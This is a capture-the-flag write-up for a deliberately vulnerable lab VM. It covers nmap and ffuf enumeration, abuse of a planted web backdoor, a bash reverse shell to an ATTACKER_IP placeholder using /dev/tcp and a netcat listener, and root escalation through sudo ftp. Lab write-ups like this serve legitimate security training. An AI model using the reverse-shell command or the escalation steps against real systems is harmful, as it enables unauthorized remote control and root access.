
Documentation for the first box of the POC serie


# BOX POC 1


---

## Summary

1. [Scan](#scan)
2. 

---

## Scan

We begin with a classic discovery of the network with nmap command :


```
nmap -sS -sV -sC -T4 $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-15 11:46 CEST
Nmap scan report for 192.168.56.104
Host is up (0.00016s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Hacked By Lazy Hackers
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:49:E3:86 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

<details>
  
<summary>scan explanation</summary>


</details>


## http port inspection

When trying to connect to the website on 192.168.53.104:80, we arrive on a "hacked" page, after using the inspect tool, I quickly find the first flag : 

<img width="1283" height="826" alt="POC1_FLAG1" src="https://github.com/user-attachments/assets/cca54507-c79d-45eb-8786-50c8eadc207b" />

Here we can see a hint for the next flag "Web Enumeration"


## Web Enumeration

For the web enumeration I choose to use the tool ffuf.

<details>
  
<summary>ffuf utility</summary>


</details>

So here is my ffuf command :

```
ffuf -c -w '/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt' -u "http://$ip/FUZZ" 
```

<details>
  
<summary>ffuf command details</summary>


</details>

And here is the result :

```   
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 8ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 222ms]
backdoor                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 0ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [20478/20478] :: Job [1/1] :: 70 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

<details>
  
<summary>ffuf result details</summary>


</details>

Here we can see the obvious "backdoor" result so I choose to test this on ```http://192.168.56.104/backdoor/``` and we arrive on a command prompt :

<img width="1328" height="385" alt="POC1_Prompt" src="https://github.com/user-attachments/assets/ff270dda-6bbc-4a7d-a2e6-357c212f5f9f" />

And it seems that we are logged as 'www-data'.

## Backdoor

I test a first command to discover where I am and I found directly the second flag :

<img width="1314" height="393" alt="POC1_Prompt_ls" src="https://github.com/user-attachments/assets/697337c7-6dc0-455c-b13e-bcbca36a4c98" />

```FLAG2{OU-SE-TROUVE-LES-DOSSIERS-PERSONNELS-DES-UTILISATEURS?}```

With a hint for the next flag "where is the personnal files of users"

Then I try to list the home file with ```ls /home/``` and here I see a user named Alix, and inside the home of Alix, the third flag prompted with this command : ```cat /home/alix/FLAG3.txt/```

<img width="1152" height="237" alt="POC1_Prompt_flag3" src="https://github.com/user-attachments/assets/2240dbe9-2848-4fa3-bedc-f0edc31a887f" />

With another hint "C'est quoi cette chaîne U1VETy1QRVJNSVNTSU9OLXwtWU9VLU5FRUQtQS1SRVZFUlNFLVNIRUxMCg== ? du base64 ?" asking what is this chain, maybe base64 ?

So I ask my precious AI assistant to decode this and this is a message saying ```SUDO-PERMISSION ~ YOU NEED A REVERSE SHELL/```


## Reverse shell

I need a reverse shell, and I already have a RCE, so I'm just going to open a reverse shell in bash. First I need to listen with my attacking PC using netcat : ```nc -lvnp 4444```

<details>
  
<summary>nc command details</summary>

```nc -lvnp 4444```

netcat command using the following parameters :

l = listen

v = verbose

n = no DNS

p = port

4444 = port used to listening (we can change the port as we want)

</details>

Then I put this command in my RCE to redirect the shell that I open : ```bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'```

<details>

<summary>reverse shell command details</summary>

```bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'```

</details>

And here is my attacking machine listening :

```
nc -lvnp 4444 

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.104.
Ncat: Connection from 192.168.56.104:60146.
bash: cannot set terminal process group (448): Inappropriate ioctl for device
bash: no job control in this shell
www-data@CTF-NOSTALGY-PIECE-OF-CAKE:/var/www/html/backdoor$
```

I do now have a reverse shell working, logged as www-data.

## Sudo permission

```sudo -l```

```
sudo -l
sudo: unable to resolve host CTF-NOSTALGY-PIECE-OF-CAKE: Temporary failure in name resolution
Matching Defaults entries for www-data on CTF-NOSTALGY-PIECE-OF-CAKE:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on CTF-NOSTALGY-PIECE-OF-CAKE:
    (root) NOPASSWD: /usr/bin/ftp
```

```https://gtfobins.github.io/```


```
Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    sudo ftp
    !/bin/sh
```

```
ls /root/
FLAG4.txt
cat /root/FLAG4.txt
FLAG4{BRAVO-TU-AS-REUSSI-CE-CTF-!!!}


░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```

